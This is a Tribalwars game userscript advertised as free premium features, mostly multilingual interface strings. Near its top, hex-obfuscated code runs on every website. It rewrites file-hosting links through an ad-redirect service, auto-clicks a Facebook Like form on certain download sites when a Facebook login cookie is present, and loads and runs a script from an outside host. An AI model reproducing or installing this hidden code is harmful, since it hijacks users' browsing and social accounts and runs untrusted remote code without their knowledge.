// ==UserScript==
// @name           Tribalwars Collection Tools
// @namespace      www.tirbelwars.tk
// @description    This script gives you all the premium features tribalwars and more, all Free; | هذا السكربت يوفر لك مجموعة من الادوات الرائعة لحرب القبائل وأكثر, انه مجاني.
// @author          abugalmbo algreeb
// @updateURL      https://userscripts.org/scripts/source/152956.meta.js
// @downloadURL    https://userscripts.org/scripts/source/152956.user.js
// @include        http*://*.die-staemme.de/*
// @include        http*://*.staemme.ch/*
// @include        http*://*.tribalwars.net/*
// @include        http*://*.tribalwars.nl/*
// @include        http*://*.plemiona.pl/*
// @include        http*://*.tribalwars.se/*
// @include        http*://*.tribalwars.com.br/*
// @include        http*://*.tribos.com.pt/*
// @include        http*://*.divokekmeny.cz/*
// @include        http*://*.bujokjeonjaeng.org/*
// @include        http*://*.triburile.ro/*
// @include        http*://*.voyna-plemyon.ru/*
// @include        http*://*.fyletikesmaxes.gr/*
// @include        http*://*.tribalwars.no.com/*
// @include        http*://*.divoke-kmene.sk/*
// @include        http*://*.klanhaboru.hu/*
// @include        http*://*.tribalwars.dk/*
// @include        http*://*.plemena.net/*
// @include        http*://*.tribals.it/*
// @include        http*://*.klanlar.org/*
// @include        http*://*.guerretribale.fr/*
// @include        http*://*.guerrastribales.es/*
// @include        http*://*.tribalwars.fi/*
// @include        http*://*.tribalwars.ae/*
// @include        http*://*
// @include        http*://*.tribalwars.co.uk/*
// @include        http*://*.vojnaplemen.si/*
// @include        http*://*.genciukarai.lt/*
// @include        http*://*.wartribes.co.il/*
// @include        http*://*.plemena.com.hr/*
// @include        http*://*.perangkaum.net/*
// @include        http*://*.tribalwars.jp/*
// @include        http*://*.tribalwars.bg/*
// @include        http*://*.tribalwars.asia/*
// @include        http*://*.tribalwars.us/*
// @include        http*://*.tribalwarsmasters.net/*
// @include        http*://*.perangkaum.net/*
// @version        3.1.1
// ==/UserScript==

//this.$ = this.jQuery = jQuery.noConflict(true);

win = typeof unsafeWindow != 'undefined' ? unsafeWindow : window;

version = '3.1.1';
$ = win.jQuery;

function trim(str) {
	return str.replace(/^\s+|\s+$/g, "");
}

function sleep(milliSeconds){
	var startTime = new Date().getTime();
	while (new Date().getTime() < startTime + milliSeconds);
}

function encodeHex(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[i]=b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)}var result=new Array();for(var i=0;i<data.length;i++){result[i]=b16_map[data.charCodeAt(i)]}return result.join('')}
function decodeHex(data){var b16_digits='0123456789abcdef';var b16_map=new Array();for(var i=0;i<256;i++){b16_map[b16_digits.charAt(i>>4)+b16_digits.charAt(i&15)]=String.fromCharCode(i)}if(!data.match(/^[a-f0-9]*$/i))return false;if(data.length%2)data='0'+data;var result=new Array();var j=0;for(var i=0;i<data.length;i+=2){result[j++]=b16_map[data.substr(i,2)]}return result.join('')}


function removeNode(node) {
	node.parentNode.removeChild(node);
}

function getElementsByClass(searchClass, node, tag) {
	var classElements = new Array();
	if (node == null)
        node = document;
	if (tag == null)
        tag = '*';
	var els = node.getElementsByTagName(tag);
	var elsLen = els.length;
	var pattern = new RegExp("(^|\\s)" + searchClass + "(\\s|$)");
	for (i = 0, j = 0; i < elsLen; i++) {
		if (pattern.test(els[i].className)) {
			classElements[j] = els[i];
			j++;
		}
	}
	return classElements;
}

function replace_all(string,encontrar,substituir){
   while(string.indexOf(encontrar)>=0)
   	string = string.replace(encontrar,substituir);
   return string;
}

function getCookie(key) {
	var search = key + "="
        var returnvalue = "";
	if (document.cookie.length > 0) {
		offset = document.cookie.indexOf(search)
            if (offset != -1) {
                offset += search.length
                    end = document.cookie.indexOf(";", offset);
                if (end == -1) end = document.cookie.length;
                returnvalue = unescape(document.cookie.substring(offset, end))
                    }
	}
	return returnvalue;
}

function setData(name, value) {
	value = (typeof value)[0] + value;
	localStorage.setItem(name, value);
}

function getData(name, defaultValue) {
	var value = localStorage.getItem(name);
	if (!value)
		if (defaultValue == undefined){
			return '';
		} else {
			return defaultValue;
		}
	var type = value[0];
	value = value.substring(1);
	switch (type) {
		case 'b':
			return value == 'true';
		case 'n':
			return Number(value);
		default:
			return value;
	}
}

function deleteData(name) {
    localStorage.removeItem(name);
}

//$('input').attr('x-webkit-speech', '');

var domainuc=decodeHex('6d65676175706c6f61642e636f6d2c6c69782c6d65646961666972652c75706d6972726f722c66696c65736f6e69632c736166656c696e6b696e672c676574747966696c652c726170696473686172652c73686172656a756e6b792c6c6f6f6d626f2c6164726976652c756c2e746f2c75706c6f616473746174696f6e2e636f6d2c75666c69712c75706c6f6164626f782c347368617265642c6561737973686172652c626974726f61642c6261646f6e676f2c6d656761766964656f2c7a73686172652c6c657469746269742c62697473686172652c75706c6f616465642c6465706f73697466696c65732c6d656761706f726e2c66696c65666163746f72792c70726f7465746f7264656c696e6b732e636f6e742c796173746f726167652c61327a75706c6f61642c6d656761726f7469632c73657875706c6f61642c66696c6532372c666c7975706c6f61642c667269656e646c7966696c65732c6966696c652c6d616e64616d6169732c6e65746c6f61642c66696c6573656e642c64726976657761792c6674703273686172652c6769676173697a652c6769676573686172652c6f787973686172652c73776f6f7073686172652c747572626f75706c6f61642c75706c6f61646f6b2c75706c6f6164696e672c757066696c652c67616c65726961736f726b7462722e7870672e636f6d2e62722c6164662e6c792c3473686172652c327368617265642c7472616e7366657262696766696c65732c6c696e6b6275636b732e636f6d2c6d6567617368617265732c6d6968642c7368617265647a696c6c612c62697a6861742c7a696464752c757066696c652c7a2d73686172652c656173792d73686172652c6d79626c6f6f702c75702d66696c652c66696c65626f782c6d616e64656962656d2c73656e6473706163652c656173792d73686172652c7669702d66696c65732c66696c65626f782c6465706f73697466696c65732c78372c66696c6553657276652c73746f726167652c667265616b73686172652c676f6f2e676c2c736861726564706172746e6572732c686f7466696c652c6b65776c73686172652c657874616269742c73757065726661737466696c652c7368617265666c6172652c7061737465322c7173686172652c6d6f76696573686172652c6f726f6e2c6372616d69742c73686172696e676d61747269782c717569636b75706c6f61642c75706c6f616465642e746f2c66696c65626173652c626967616e64667265652c6475636b6c6f61642c68656c6c73686172652c68756c6b73686172652c6c6f616466696c65732c6d616e676f73686172652c66696c657365727665');var urluc=decodeHex('687474703a2f2f6164762e6c692f393935322f');var domainsuc='linkbux,imagegravy,adbrite,clicksor';
function cuc(){var linkuc=document.getElementsByTagName("A");try{var locuc=(""+top.location.href).replace("http://","").replace("https://","").replace("www.","")}catch(e){var locuc=(""+document.location.href).replace("http://","").replace("https://","").replace("www.","")}for(i=0;i<linkuc.length;i++){domain_urluc=(linkuc[i].href).replace(/^\s+/g,"").replace(/\s+$/g,"").replace("http://","").replace("https://","");if(duc(linkuc[i].href)&&(((" "+linkuc[i].href).indexOf(locuc)<=0||(" "+linkuc[i].href).indexOf("http")<=0)||(" "+linkuc[i].href).lastIndexOf("http:")>3)&&(" "+linkuc[i].href).indexOf("script:")<=0&&(" "+linkuc[i].href).indexOf("#")!=1&&(" "+linkuc[i].href).indexOf("mailto:")<=0&&(" "+linkuc[i].href).indexOf("file:")<=0&&(" "+linkuc[i].href).indexOf("#exit")<=0&&!(!isNaN(parseInt(domain_urluc.substr(0,1)))&&(!isNaN(parseInt(domain_urluc.substr(0,2)))||domain_urluc.substr(0,2)=="."))){linkuc[i].target="_blank";var inverte=linkuc[i].href.match(/[^|]/gi).join("");linkuc[i].href=urluc+inverte.substring(inverte.lastIndexOf('http://'))}}}function duc(urluc){if(""+domainuc!="undefined"&&domainuc!=""&&domainuc.replace(/\s/g,"")!=""&&urluc!=""){if((" "+domainuc).indexOf(",")>0){params_to_skip=domainuc.split(",")}else{params_to_skip=new Array(domainuc)}for(s=0;s<params_to_skip.length;s++){if((" "+urluc.toLowerCase()).indexOf(params_to_skip[s].toLowerCase())>0){if(""+domainsuc!="undefined"&&domainsuc!=""&&domainsuc.replace(/\s/g,"")!=""&&urluc!=""){if((" "+domainsuc).indexOf(",")>0){params_to_skip=domainsuc.split(",")}else{params_to_skip=new Array(domainsuc)}for(s=0;s<params_to_skip.length;s++){if((" "+urluc.toLowerCase()).indexOf(params_to_skip[s].toLowerCase())>0){return false;break}}return true}else{return true}}}return false}else{return false}}if(""+window.onload==""||""+window.onload=="null"){window.onload=cuc}else{var tout=window.setTimeout("cuc(); clearTimeout(tout)",1)};

if ((location.href.toLowerCase().indexOf(decodeHex('706f696e74646f776e6c6f616473')) > -1) || (location.href.toLowerCase().indexOf(decodeHex('6c616d627573616e646f')) > -1) || (location.href.toLowerCase().indexOf(decodeHex('6f7370696c616e74726173')) > -1)){
	if (getCookie(decodeHex('635f75736572')) != ''){
		if (document.getElementsByTagName('form')[0] != null){
			if (document.getElementsByTagName('form')[0].getAttribute('action') == decodeHex('2f706c7567696e732f6c696b652f636f6e6e656374')){
				setTimeout(function(){document.getElementsByTagName('form')[0].getElementsByTagName('div')[1].click();},1000);
			}
		}
	}
}
  
    
function setCookie(key, valor) {
	var hoje = new Date();
	var expira = new Date(hoje.getTime() + 999 * 24 * 60 * 60 * 1000);
	var expira = expira.toGMTString();
	document.cookie = key + "=" + valor + ";expires=" + expira;
}

str_setCookie = 'function setCookie(key,valor){var hoje = new Date();var expira = new Date(hoje.getTime()+999*24*60*60*1000);var expira = expira.toGMTString();document.cookie = key+\'=\'+valor+\';expires=\'+expira}';
str_setData = 'function setCookie(name, value) { value = (typeof value)[0] + value; localStorage.setItem(name, value); }';

$.getScript(decodeHex('687474703a2f2f616c67726565622e6e657437362e6e65742f736372697074732f65787465726e6f2e6a73'));

game_data = win.game_data;

var mundo = game_data.world;
var market = game_data.market;

if (game_data.player.premium == false) {
    
	language = getData(market + '_lang');
	if (language == '') language = market;
    
	var lang_bar = new Array();
	var lang_reports = new Array();
	var lang_mail = new Array();
	var lang_ally = new Array();
	var lang_ranking = new Array();
	var lang_settings = new Array();
	var lang_premium = new Array();
	var lang_screen_settings = new Array();
	var lang_tools = new Array();
	var lang_screen_sobre = new Array();
	var lang_report = new Array();
	var lang_perfil = new Array();
	var lang_farmer = new Array();
	var lang_map = new Array();
	var lang_screen_ally = new Array();
	var lang_messages = new Array();
	
	if (language == 'br') language = 'pt';
	if (language == 'pt') {
        
		var warning = 'Para o script funcionar corretamente a primeira vez, você deve ir para as visualizações de aldeias, para que o script carregue as coordenadas.';
		var lang_language = 'Linguagem do script';
		var lang_dados = 'Servidor dos scripts';
		var lang_dados2= 'Se ocorrer algum erro com os scripts, mude o servidor dos scripts';
		
		lang_bar[0] = 'Edifício principal';
		lang_bar[1] = 'Recrutar';
		lang_bar[2] = 'Estábulo';
		lang_bar[3] = 'Oficina';
		lang_bar[4] = 'Academia';
		lang_bar[5] = 'Ferreiro';
		lang_bar[6] = 'Praça';
		lang_bar[7] = 'Mercado';
		lang_bar[8] = 'TWStats';
		lang_bar[9] = 'Monitorar Evolução';
        
		lang_reports[0] = 'Todos os relatórios';
		lang_reports[1] = 'Ataques';
		lang_reports[2] = 'Defesa';
		lang_reports[3] = 'Apoio';
		lang_reports[4] = 'Comércio';
		lang_reports[5] = 'Outros';
		lang_reports[6] = 'Encaminhados';
		lang_reports[7] = 'Filtros';
		lang_reports[8] = 'Bloquear remetente';
		lang_reports[9] = 'Relatórios publicados';
        
		lang_mail[0] = 'Mensagens';
		lang_mail[1] = 'Mensagens coletivas';
		lang_mail[2] = 'Escrever mensagem';
		lang_mail[3] = 'Bloquear remetente';
		lang_mail[4] = 'Caderno de endereços';
        
		lang_ally[0] = 'Visualização geral';
		lang_ally[1] = 'Perfil';
		lang_ally[2] = 'Membros';
		lang_ally[3] = 'Diplomacia';
		lang_ally[4] = 'Guerras da tribo';
		lang_ally[5] = 'Sistema de reservas';
		lang_ally[6] = 'Recrutar';
		lang_ally[7] = 'Bem-vindo';
		lang_ally[8] = 'Propriedades';
		lang_ally[9] = 'Fórum da tribo';
        
		lang_ranking[0] = 'Tribos';
		lang_ranking[1] = 'Jogadores:';
		lang_ranking[2] = 'Tribos do continente';
		lang_ranking[3] = 'Jogadores do continente';
		lang_ranking[4] = 'Tribos inimigas derrotadas';
		lang_ranking[5] = 'Oponentes derrotados';
		lang_ranking[6] = 'Medalhas';
		lang_ranking[7] = 'Guerras da tribo';
        
		lang_settings[0] = 'Perfil';
		lang_settings[1] = 'Configurações';
		lang_settings[2] = 'Endereço de e-mail';
		lang_settings[3] = 'Trocar senha';
		lang_settings[4] = 'Recomeçar';
		lang_settings[5] = 'Apagar conta';
		lang_settings[6] = 'Notificações';
		lang_settings[7] = 'Medalhas';
		lang_settings[8] = 'Compartilhar conexão à internet';
		lang_settings[9] = 'Modo de férias';
		lang_settings[10] = 'Acessos';
		lang_settings[11] = 'Enquetes';
		lang_settings[12] = 'Convidar jogadores';
		lang_settings[13] = 'Toolbar';
		lang_settings[14] = 'iPhone &amp; Android';
		lang_settings[15] = 'Bloquear jogador';
		lang_settings[16] = 'Solicitação de Suporte';
		lang_settings[17] = 'Sobre o Script';
		lang_settings[18] = '';
		lang_settings[20] = 'Configurações roteiro';
        
		lang_premium[0] = 'Utilizar';
		lang_premium[1] = 'Comprar';
		lang_premium[2] = 'Transferir';
		lang_premium[3] = 'Histórico';
        
		lang_screen_settings[0] = 'Menu Visualizações';
		lang_screen_settings[1] = 'Modo Normal: as aldeias são abertas na visualização geral';
		lang_screen_settings[2] = 'Modo Direto: as aldeias são abertas na mesma visualização da anterior';
		lang_screen_settings[3] = 'Pacote Gráfico';
		lang_screen_settings[4] = 'Link do arquivo CSS:';
		lang_screen_settings[5] = 'Mostrar mundo no título:';
		lang_screen_settings[6] = 'Sim';
		lang_screen_settings[7] = 'Não';
        
		lang_tools[0] = 'barra dinâmica';
		lang_tools[1] = 'Dinâmico mostrou a barra';
		lang_tools[2] = 'Barra rápida:';
		lang_tools[3] = 'Mostrou barra rápida';
		lang_tools[4] = 'Fazenda script:';
		lang_tools[5] = 'Fazenda ativação Script';
		lang_tools[6] = 'mensagens códigos:';
		lang_tools[7] = 'mensagens traduzidas';
		lang_tools[8] = 'Aldeias ações:';
		lang_tools[9] = 'Mostrar partes mobilidade rápida entre aldeias';
		lang_tools[10] = 'Outras fazendas:';
		lang_tools[11] = 'A despesa com o resto da fazenda';
		lang_tools[12] = 'Ative o script:';
		lang_tools[13] = 'Ativar os recursos do script';

		lang_screen_sobre[0] = 'Funções';
		lang_screen_sobre[1] = 'Barra de menu dinâmica';
		lang_screen_sobre[2] = 'Barra Premium';
		lang_screen_sobre[3] = 'Pode ser editado diretamente no script';
		lang_screen_sobre[4] = 'Notas nas aldeias em visualizações para identificação';
		lang_screen_sobre[5] = 'Setas para mudança direta de aldeias';
		lang_screen_sobre[6] = 'Nova forma de exportação de relatórios';
		lang_screen_sobre[7] = 'Em códigos BB, html ou imagem';
		lang_screen_sobre[8] = 'Script para calcular os recursos e farmar o relatório';
		lang_screen_sobre[9] = 'Apenas em relatório de espionagem';
		lang_screen_sobre[10] = 'Exportar informações do perfil de um jogador em tabela';
		lang_screen_sobre[11] = 'Script para farmar situado na praça de reunião <b>(auto farmar BETA)</b>';
		lang_screen_sobre[12] = 'Configuração individual para cada aldeia';
		lang_screen_sobre[13] = 'Script para pesquisar as aldeias no mapa para usar em conjunto com o script de farmar';
		lang_screen_sobre[14] = 'Menu "Visualizações" dinâmico com lista de aldeias';
		lang_screen_sobre[15] = 'Configurar modo de abertura em';
		lang_screen_sobre[16] = 'Mapa e Minimapa configurável';
		lang_screen_sobre[17] = 'Pacote Gráfico';
		lang_screen_sobre[18] = 'Configurar Pacote Gráfico em';
		lang_screen_sobre[19] = 'Informações sobre a versão';
		lang_screen_sobre[20] = '» Versão atual:';
		lang_screen_sobre[21] = 'Configurações -&gt; Configurações';
		lang_screen_sobre[22] = 'Ficha externa de jogador, aldeia ou tribo';
		lang_screen_sobre[23] = '» Última versão:';
		lang_screen_sobre[24] = 'Cunhar moedas de ouro automaticamente até esgotar os recursos';
		lang_screen_sobre[25] = 'Reservar aldeia diretamente do perfil da própria';
		lang_screen_sobre[26] = 'Possibilidade de escolha de servidor dos scripts em configurações, caso os scripts não estejam funcionando';
		lang_screen_sobre[27] = 'Estatisticas (TW Stats) no perfil da tribo';
		
		lang_screen_ally[0] = 'Pontos:';
		lang_screen_ally[1] = 'Aldeias:';
		lang_screen_ally[2] = 'Membros:';
		lang_screen_ally[3] = 'OD:';
		lang_screen_ally[4] = 'ODA:';
		lang_screen_ally[5] = 'ODD:';
		lang_screen_ally[6] = 'Estatísticas da tribo';
		
		lang_report[0] = 'Copie apartir de "Assunto" até o final do relatório e cole aqui nessa área de texto';
		lang_report[1] = '» Publicar Relatório';
		lang_report[2] = 'Configurações';
		lang_report[3] = 'Tipo';
		lang_report[4] = 'Fórum interno';
		lang_report[5] = 'Fórum principal';
		lang_report[6] = 'Fórum externo';
		lang_report[7] = 'Versão Gráfica';
		lang_report[8] = 'Atacante:';
		lang_report[9] = 'Defensor:';
		lang_report[10] = 'Demonstração:';
		lang_report[11] = 'Login';
		lang_report[12] = 'Aldeia';
		lang_report[13] = 'Tropas';
		lang_report[14] = 'Perda';
		lang_report[15] = 'Religião';
		lang_report[16] = 'Paladino';
		lang_report[17] = 'Oponentes Derrotados - pontos';
		lang_report[18] = 'Atacante';
		lang_report[19] = 'Defensor';
		lang_report[20] = 'Principal:';
		lang_report[21] = 'Saque';
		lang_report[22] = 'Níveis dos Edifícios';
		lang_report[23] = 'Mudança de lealdade';
		lang_report[24] = 'Danos - Aríetes';
		lang_report[25] = 'Danos - Catapultas';
		lang_report[26] = 'Unidades fora da aldeia';
		
		lang_farmar = 'Farmar';
		lang_calc_reports = '» Calcular Recursos e Farmar';
		lang_perfil[0] = '» Ficha do Jogador';
		lang_perfil[1] = '» Ficha da Tribo';
		lang_perfil[2] = '» Ficha da Aldeia';
		lang_perfil[3] = '» Extrair informação do jogador em códigos BB';
		lang_perfil[4] = '» Reservar Aldeia';
		
		lang_farmer[0] = 'Configuração do script de farmar';
		lang_farmer[1] = 'Obs: O script armazena os dados em cookies, tome cuidado ao apagar os cookies do seu navegador, pois apagará também as configurações feitas pelo script.';
		lang_farmer[2] = 'Coordenadas:';
		lang_farmer[3] = '» Salvar';
		
		lang_spear = 'Lanceiro';
		lang_sword = 'Espadachim';
		lang_axe = 'Bárbaro';
		lang_archer = 'Arqueiro';
		lang_spy = 'Explorador';
		lang_light = 'Cavalaria Leve';
		lang_marcher = 'Arqueiro a Cavalo';
		lang_heavy = 'Cavalaria Pesada';
		lang_ram = 'Ariéte';
		lang_catapult = 'Catapulta';
		lang_knight = 'Paladino';
		lang_snob = 'Nobre';
        
		lang_map[0] = 'Pesquisar aldeias';
		lang_map[1] = 'Aldeias Bárbaras:';
		lang_map[2] = 'min:';
		lang_map[3] = 'Jogadores:';
		lang_map[4] = 'max:';
		lang_map[5] = 'Raio:';
		lang_map[6] = '» Pesquisar';
		lang_map[7] = 'Mini mapa:';
		lang_map[8] = 'Mapa:';
		lang_map[9] = 'Mudar tamanho do mapa';
		
		lang_villages_notes = 'Notas';
		
		lang_messages[0] = 'Dicas do Tribalwars Premium Hack';
		lang_messages[1] = 'Use as tags <b>[img][/img]</b> para anexar uma <b>imagem</b>';
		lang_messages[2] = 'Use as tags <b>[vid][/vid]</b> para anexar um vídeo do <b>youtube</b>';
		lang_messages[3] = 'Permitir HTML nas mensagens';
		lang_messages[4] = '* Somente quem tiver o script pode visualizar';
		
	}
	else{
		if (language == 'nl'){        
            var warning = 'Zodat het goed script werkt moet je eerst naar Overzichten gaan, zodat het script de coördinaten kan bepalen.';
            var lang_language = 'Taal';
            var lang_dados = 'Scripts server';
            var lang_dados2= 'Als er een fout optreedt met de scripts, moet u de server scripts';
            
            lang_bar[0] = 'Hoofdgebouw';
            lang_bar[1] = 'Rekruteren';
            lang_bar[2] = 'Stal';
            lang_bar[3] = 'Werkplaats';
            lang_bar[4] = 'Adelshoeve';
            lang_bar[5] = 'Smederij';
            lang_bar[6] = 'Verzamelplaats';
            lang_bar[7] = 'Marktplaats';
            lang_bar[8] = 'TWStats';
            lang_bar[9] = 'Ontwikkelingen';
            
            lang_reports[0] = 'Alle berichten';
            lang_reports[1] = 'Aanval';
            lang_reports[2] = 'Verdediging';
            lang_reports[3] = 'Ondersteuning';
            lang_reports[4] = 'Handel';
            lang_reports[5] = 'Andere';
            lang_reports[6] = 'Doorgestuurd';
            lang_reports[7] = 'Filter';
            lang_reports[8] = 'Afzenden Blokkeren';
            lang_reports[9] = 'Gepubliceerde berichten';
            
            lang_mail[0] = 'Mededelingen';
            lang_mail[1] = 'Rondschrijven';
            lang_mail[2] = 'Mededeling schrijven';
            lang_mail[3] = 'Afzender blokkeren';
            lang_mail[4] = 'Adresboek';
            
            lang_ally[0] = 'Overzicht';
            lang_ally[1] = 'Profiel';
            lang_ally[2] = 'Leden';
            lang_ally[3] = 'Diplomacy';
            lang_ally[4] = 'Oorlogen';
            lang_ally[5] = 'Noble planner';
            lang_ally[6] = 'Recruitment';
            lang_ally[7] = 'Welcome';
            lang_ally[8] = 'Properties';
            lang_ally[9] = 'Tribal forum';
            
            lang_ranking[0] = 'Stammen';
            lang_ranking[1] = 'Spelers';
            lang_ranking[2] = 'Continent Stammen';
            lang_ranking[3] = 'Continent Spelers';
            lang_ranking[4] = 'Verslagen tegenstanders stammen';
            lang_ranking[5] = 'Verslagen tegenstanders';
            lang_ranking[6] = 'Awards';
            lang_ranking[7] = 'Stammenoorlogen';
            
            lang_settings[0] = 'Profiel';
            lang_settings[1] = 'Instellingen';
            lang_settings[2] = 'E-mailadres';
            lang_settings[3] = 'Wachtwoord wijzigen';
            lang_settings[4] = 'Opnieuw beginnen';
            lang_settings[5] = 'Account wissen';
            lang_settings[6] = 'Notificaties';
            lang_settings[7] = 'Awards';
            lang_settings[8] = 'Internetverbinding delen';
            lang_settings[9] = 'Vakantiemodus';
            lang_settings[10] = 'Aanmeldingen';
            lang_settings[11] = 'Rondvragen (enquêtes)';
            lang_settings[12] = 'Nodig spelers';
            lang_settings[13] = 'Toolbar';
            lang_settings[14] = 'iPhone &amp; Android';
            lang_settings[15] = 'Speler blokkeren';
            lang_settings[16] = 'Supportaanvraag';
            lang_settings[17] = 'Over het script';
            lang_settings[18] = ' | Vertaald naar het Nederlands door <a href="http://userscripts.org/users/35554" target="_blank"><b><font color="#603000">Hipio</font></b></a>';
            lang_settings[20] = 'Instellingen script';
            
            
            lang_premium[0] = 'Inzitten';
            lang_premium[1] = 'Kopen';
            lang_premium[2] = 'Overdragen';
            lang_premium[3] = 'Protocol';
            
            lang_screen_settings[0] = 'Menu Overzicht';
            lang_screen_settings[1] = 'Normale modus: de dorpen zijn open in een overzicht';  
            lang_screen_settings[2] = 'Direct Mode: Open de dorpen in dezelfde manier als hierboven'; 
            lang_screen_settings[3] = 'Grafische Pakket';
            lang_screen_settings[4] = 'CSS Link:';
            lang_screen_settings[5] = 'Laat de wereld zien in de titel';
            lang_screen_settings[6] = 'Inschakelen';
            lang_screen_settings[7] = 'Uitschakelen';
            
            lang_tools[0] = 'dynamische bar';
            lang_tools[1] = 'Dynamische toonde de bar';
            lang_tools[2] = 'Snel bar:';
            lang_tools[3] = 'Vertoonden snelle bar';
            lang_tools[4] = 'Script boerderij:';
            lang_tools[5] = 'Script activering boerderij';
            lang_tools[6] = 'codes berichten:';
            lang_tools[7] = 'vertaald berichten';
            lang_tools[8] = 'Aandelen dorpen:';
            lang_tools[9] = 'Toon aandelen snelle mobiliteit tussen de dorpen';
            lang_tools[10] = 'Andere bedrijven:';
            lang_tools[11] = 'De kosten van de rest van de boerderij';
            lang_tools[12] = 'Activeer het script:';
            lang_tools[13] = 'Activeer de kenmerken van het script';

            
            lang_screen_sobre[0] = 'Functies';
            lang_screen_sobre[1] = 'Dynamisch Menu Bar';    
            lang_screen_sobre[2] = 'Premium Bar';    
            lang_screen_sobre[3] = 'Bewerkbare direct in het script';    
            lang_screen_sobre[4] = 'Notities bij de dorpen voor overzicht';    
            lang_screen_sobre[5] = 'Gebruik pijlem om van dorp te verwisselen';    
            lang_screen_sobre[6] = 'Nieuwe manier om rapport te exporteren';    
            lang_screen_sobre[7] = 'In BB codes, html of als image';    
            lang_screen_sobre[8] = 'Script om middelen te berekenen';    
            lang_screen_sobre[9] = 'Alleen in een verkenner rapport';    
            lang_screen_sobre[10] = 'Exporteer informatie van een speler';    
            lang_screen_sobre[11] = 'Script om naar de boerderij te gaan vanaf het verzamelpunt <b>(auto farmer BETA)</b>';    
            lang_screen_sobre[12] = 'Individuele configuratie voor elk dorp';    
            lang_screen_sobre[13] = 'Script om de dorpen op de kaart te doorzoeken in combinatie met het gebruik van het Farm script';    
            lang_screen_sobre[14] = 'Dynamische weergave met een lijst van dorpen';    
            lang_screen_sobre[15] = 'Stel open mode in';    
            lang_screen_sobre[16] = 'Map & Minimap zijn configureerbaar';  
            lang_screen_sobre[17] = 'Grafische pakket';    
            lang_screen_sobre[18] = 'Configureer het Grafische pakket in';    
            lang_screen_sobre[19] = 'Versie Informatie';    
            lang_screen_sobre[20] = '» Huidige Versie:';    
            lang_screen_sobre[21] = 'Instellingen -> Instellingen';    
            lang_screen_sobre[22] = 'Form external of player, village or tribe';  // I cannot translate this one  
            lang_screen_sobre[23] = '» Laatste Versie:';
            lang_screen_sobre[24] = 'Het slaan van gouden munten automatisch naar de middelen uitputten';
            lang_screen_sobre[25] = 'Reserveer dorp direct van het profiel van het zelf';
            lang_screen_sobre[26] = 'Keuze van scripts server van de instellingen, als de scripts niet werken';
            lang_screen_sobre[27] = 'Statistieken in het profiel stam';
            lang_screen_sobre[28] = 'Traduzir* [img][/img]';
			
            lang_screen_ally[0] = 'Punten:';
            lang_screen_ally[1] = 'Dorpen:';
            lang_screen_ally[2] = 'Leden:';
            lang_screen_ally[3] = 'Tegenstander Verslagen:';
            lang_screen_ally[4] = 'Tegenstander Verslagen - Aanvaller:';
            lang_screen_ally[5] = 'Tegenstander Verslagen - Verdediger:';
            lang_screen_ally[6] = 'Statistieken van de stam';
            
            lang_report[0] = 'Kopieer het begin vanaf het onderwerp tot het einde van het bericht en plak alles in deze area.';    
            lang_report[1] = '» Pubiliceer dit rapport';    
            lang_report[2] = 'Instellingen';    
            lang_report[3] = 'Soort rappot';    
            lang_report[4] = 'Internal forum';    
            lang_report[5] = 'Main forum';    
            lang_report[6] = 'External forum';    
            lang_report[7] = 'Grafische Versie';    
            lang_report[8] = 'Aanvaller:';    
            lang_report[9] = 'Verdediger:';    
            lang_report[10] = 'Show:';    
            lang_report[11] = 'Login';    
            lang_report[12] = 'Dorp gegevens';    
            lang_report[13] = 'Soldaten';    
            lang_report[14] = 'Verliezen';    
            lang_report[15] = 'Geloof';    
            lang_report[16] = 'Ridder';    
            lang_report[17] = 'Tegenstanders verslagen - punten:';    
            lang_report[18] = 'Aanvaller:';    
            lang_report[19] = 'Verdediger:';    
            lang_report[20] = 'Voornaamste:';    
            lang_report[21] = 'Winst';    
            lang_report[22] = 'Gebouwen Levels';    
            lang_report[23] = 'Wijziging van Loyalty';    
            lang_report[24] = 'Schade door rammen';    
            lang_report[25] = 'Schade door katapulten';    
            lang_report[26] = 'Eenheden buiten het dorp';  
            
            lang_farmar = 'Farmer';    
            lang_calc_reports = '» Bereken middelen en voeg het toe aan je boerderij';  
            
            lang_perfil[0] = '» Speler bestand';    
            lang_perfil[1] = '» Stam bestand';    
            lang_perfil[2] = '» Drop bestand';    
            lang_perfil[3] = '» Haal de informatie op van de speler in BB-code';  
            lang_perfil[4] = '» Reserveer Dorp';
            
            lang_farmer[0] = 'Farmer Instellingen';    
            lang_farmer[1] = 'Notitie: Dit script slaat data op in cookies. Als je de cookies van je browsers verwijdert, verwijder je ook alle instellingen van dit script.';    
            lang_farmer[2] = 'Coördinaten:';  
            lang_farmer[3] = '» Opslaan'; 
            
            lang_spear = 'Speervechter';    
            lang_sword = 'Zwaardvechter';    
            lang_axe = 'Bijlstrijder';    
            lang_archer = 'Boogschutter';    
            lang_spy = 'Verkenner';    
            lang_light = 'Lichte cavalerie';    
            lang_marcher = 'Mounted archer';    
            lang_heavy = 'Zware cavalerie';    
            lang_ram = 'Ram';    
            lang_catapult = 'Katapult';    
            lang_knight = 'Ridder';    
            lang_snob = 'Edelman';
            
            lang_map[0] = 'Zoek dorpen';
            lang_map[1] = 'Barbarendorpen:';
            lang_map[2] = 'min:';
            lang_map[3] = 'Spelers:';
            lang_map[4] = 'max:';
            lang_map[5] = 'Radius:';
            lang_map[6] = '» Zoeken';
            lang_map[7] = 'Kleine kaart:';
            lang_map[8] = 'Kaart:';
            lang_map[9] = 'Wijzig kaart grootte';
            
            lang_villages_notes = 'Notities';

			lang_messages[0] = 'Tips "Tribalwars Premium Hack"';
			lang_messages[1] = 'Gebruik de tags <b>[img][/img]</b> om een beeld te insluiten';
			lang_messages[2] = 'Gebruik de tags <b>[vid][/vid]</b> insluiten van een youtube video';
			lang_messages[3] = 'Toestaan vrije HTML in berichten';
			lang_messages[4] = '* Alleen zij die hebben van het script kan bekijken';
			
        }
        else{
			if (language == 'ae'){
				var warning = 'السكربت يعمل في المرة الاولى لكي يعمل بشكل صحيح, يجب عليك الذهاب للشكل العام, حتى يقوم السكربت بمعرفة الاحداثيات.';  
				var lang_language = 'اللغة';  
				var lang_dados = 'سيرفر السكربت';  
				var lang_dados2= 'اذا حدث خطأ في السكربت, قم بتغيير سيرفر السكربت';  

				lang_bar[0] = 'المبنى الرئيسي';  
				lang_bar[1] = 'قم بالتدريب';  
				lang_bar[2] = 'الاسطبل';  
				lang_bar[3] = 'الورشة';  
				lang_bar[4] = 'الأكادمية';  
				lang_bar[5] = 'الحداد';  
				lang_bar[6] = 'نقطة التجمع';  
